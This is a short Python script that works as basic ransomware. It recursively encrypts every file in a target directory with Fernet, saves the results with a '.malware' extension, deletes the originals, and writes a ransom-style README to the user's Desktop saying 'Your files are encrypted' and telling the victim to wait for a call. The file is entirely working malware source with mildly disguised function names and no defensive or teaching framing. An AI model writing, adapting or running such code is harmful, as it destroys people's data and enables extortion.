import os
from cryptography.fernet import Fernet

def create_encryption_key():
    return Fernet.generate_key()

def store_key(encryption_key, path_to_key_file):
    with open(path_to_key_file, 'wb') as key_file:
        key_file.write(encryption_key)


# Encrypt a given file
def secure_file(file_path, encryption_engine):
    with open(file_path, 'rb') as target_file:
        file_contents = target_file.read()
    encrypted_content = encryption_engine.encrypt(file_contents)
    output_file = file_path + '.malware'
    with open(output_file, 'wb') as secured_file:
        secured_file.write(encrypted_content)
    os.remove(file_path)


# Encrypts files within a directory
def secure_directory(target_directory, encryption_engine):
    for root_dir, sub_dirs, files in os.walk(target_directory):
        for individual_file in files:
            if not individual_file.endswith('.malware'):
                secure_file(os.path.join(root_dir, individual_file), encryption_engine)


# notification message
def leave_encryption_details(path_for_info, notification):
    info_file = os.path.join(path_for_info, "README.txt")
    with open(info_file, 'w') as info_text:
        info_text.write(notification)


def execute_encryption():
    user_desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    current_directory = os.getcwd()
    key_storage_path = os.path.join(current_directory, "secret.key")
    message_for_victim = "Your files are encrypted and now you have problem! Nothing personal! You need to wait for a call"

    if not os.path.isfile(key_storage_path):
        encryption_key = create_encryption_key()
        store_key(encryption_key, key_storage_path)
        print("New encryption key is now stored.")
    else:
        with open(key_storage_path, 'rb') as existing_key:
            encryption_key = existing_key.read()
        print("Loaded the existing encryption key.")

    encryption_tool = Fernet(encryption_key)
    files_to_encrypt = './test'
    secure_directory(files_to_encrypt, encryption_tool)

    leave_encryption_details(user_desktop, message_for_victim)
    print("Encryption is complete. Instruction on the desktop.")


if __name__ == "__main__":
    execute_encryption()